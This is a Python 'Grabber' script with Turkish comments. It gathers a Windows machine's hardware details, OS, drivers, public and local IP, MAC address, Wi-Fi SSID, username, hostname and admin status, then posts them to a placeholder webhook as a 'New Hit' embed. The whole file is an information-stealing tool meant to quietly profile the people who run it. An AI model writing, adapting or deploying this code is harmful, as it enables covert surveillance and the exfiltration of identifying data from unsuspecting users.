import platform
import socket
import uuid
import psutil
import requests
import json
import wmi
import subprocess
import datetime
import os
import sys
import ctypes
import locale

# buraya webhook yazın bilader
hook = "BENİ_DEGİSTİR_ASLAN_KARDESİM_WEBHOOK"

def size(b, suffix="B"):
    factor = 1024
    for unit in ["", "K", "M", "G", "T", "P"]:
        if b < factor:
            return f"{b:.2f}{unit}{suffix}"
        b /= factor

def get_hw():
    d = {}
    
    # islemci
    u = platform.uname()
    d['cpu'] = u.processor
    d['cores'] = psutil.cpu_count(logical=False)
    d['threads'] = psutil.cpu_count(logical=True)
    
    # ram durumu
    mem = psutil.virtual_memory()
    d['ram_total'] = size(mem.total)
    d['ram_free'] = size(mem.available)
    
    # ekran karti
    try:
        w = wmi.WMI()
        gpu_list = []
        for g in w.Win32_VideoController():

            ram = "Unknown"
            if hasattr(g, 'AdapterRAM') and g.AdapterRAM:
                 ram = size(abs(int(g.AdapterRAM)))
            gpu_list.append(f"{g.Name} ({ram})")
        d['gpu'] = gpu_list
    except:
        d['gpu'] = ["Error"]

    # anakart
    try:
        board = w.Win32_BaseBoard()[0]
        d['mobo'] = f"{board.Manufacturer} {board.Product}"
    except:
        d['mobo'] = "Unknown"

    # bios
    try:
        bios = w.Win32_BIOS()[0]
        d['bios'] = f"{bios.Manufacturer} {bios.Name}"
    except:
        d['bios'] = "Unknown"

    # diskler
    parts = psutil.disk_partitions()
    disk_list = []
    for p in parts:
        try:
            usage = psutil.disk_usage(p.mountpoint)
            disk_list.append(f"{p.device} ({p.fstype}): {size(usage.free)} / {size(usage.total)}")
        except:
            pass
    d['disks'] = disk_list

    # fiziksel disk
    try:
        phys = []
        for drv in w.Win32_DiskDrive():
            phys.append(f"{drv.Model} ({size(int(drv.Size))})")
        d['phys_disks'] = phys
    except:
        d['phys_disks'] = []

    return d

def get_sys():
    d = {}
    d['os'] = f"{platform.system()} {platform.release()} ({platform.version()})"
    
    try:
        d['lang'] = str(locale.getdefaultlocale())
    except:
        d['lang'] = "?"

    now = datetime.datetime.now()
    d['time'] = now.strftime("%Y-%m-%d %H:%M:%S")
    
    # uptime hesapla
    try:
        boot = datetime.datetime.fromtimestamp(psutil.boot_time())
        d['uptime'] = str(now - boot).split('.')[0]
    except:
        d['uptime'] = "?"

    # driverlar
    try:
        # cok uzun surmesin diye sadece sayisini aliyozke
        out = subprocess.check_output("driverquery /NH", shell=True).decode('utf-8', errors='ignore')
        lines = [x for x in out.splitlines() if x.strip()]
        d['drv_count'] = len(lines)
        d['drv_sample'] = ", ".join([l.split()[0] for l in lines[:5]]) + "..."
    except:
        d['drv_sample'] = "Error"

    return d

def get_net():
    d = {}
    # ip bul
    try:
        d['pub_ip'] = requests.get('https://api.ipify.org', timeout=3).text
    except:
        d['pub_ip'] = "-"
    
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        d['loc_ip'] = s.getsockname()[0]
        s.close()
    except:
        d['loc_ip'] = "127.0.0.1"

    d['mac'] = ':'.join(['{:02x}'.format((uuid.getnode() >> elements) & 0xff) for elements in range(0,2*6,2)][::-1])

    # wifi ssid
    try:
        out = subprocess.check_output("netsh wlan show interfaces", shell=True).decode('utf-8', errors='ignore')
        ssid = "Yok"
        for l in out.splitlines():
            if "SSID" in l and "BSSID" not in l:
                ssid = l.split(":")[1].strip()
                break
        d['ssid'] = ssid
    except:
        d['ssid'] = "Hata"

    return d

def get_usr():
    d = {}
    try:
        d['user'] = os.getlogin()
    except:
        d['user'] = "?"
    d['pc'] = socket.gethostname()
    
    try:
        admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
    except:
        admin = False
    d['admin'] = "Evet" if admin else "Hayir"
    return d

def send(data):
    if "YOUR_WEBHOOK" in hook:
        print("Webhook girmeyi unuttun kanka")
        return

    # embed olustur filan
    embed = {
        "title": f"New Hit: {data['usr']['user']}@{data['usr']['pc']}",
        "color": 0xFF0000,
        "fields": []
    }

    def f(n, v, i=True):
        s = str(v)
        if len(s) > 1000: s = s[:1000] + "..."
        embed['fields'].append({"name": n, "value": s, "inline": i})

    # hw
    h = data['hw']
    f("CPU", f"{h['cpu']} ({h['cores']}/{h['threads']})", False)
    f("RAM", f"{h['ram_free']} / {h['ram_total']}")
    f("GPU", ", ".join(h['gpu']))
    f("Mobo", h['mobo'])
    f("Disks", "\n".join(h['disks']), False)

    # sys
    s = data['sys']
    f("OS", s['os'])
    f("Uptime", s['uptime'])
    f("Time", s['time'], False)
    f("Drivers", f"Total: {s.get('drv_count', '?')}\n{s['drv_sample']}", False)

    # net
    n = data['net']
    f("IP", f"{n['pub_ip']} / {n['loc_ip']}")
    f("MAC", n['mac'])
    f("Wifi", n['ssid'])

    # usr
    u = data['usr']
    f("Admin", u['admin'])

    payload = {
        "username": "Grabber",
        "embeds": [embed]
    }

    try:
        requests.post(hook, json=payload)
        print("Yollandi!")
    except Exception as e:
        print(f"Hata oldu: {e}")

def main():
    print("Bilgiler toplaniyor...")
    # hepsini topla
    full_data = {
        "hw": get_hw(),
        "sys": get_sys(),
        "net": get_net(),
        "usr": get_usr()
    }
    
    send(full_data)

if __name__ == "__main__":
    main()
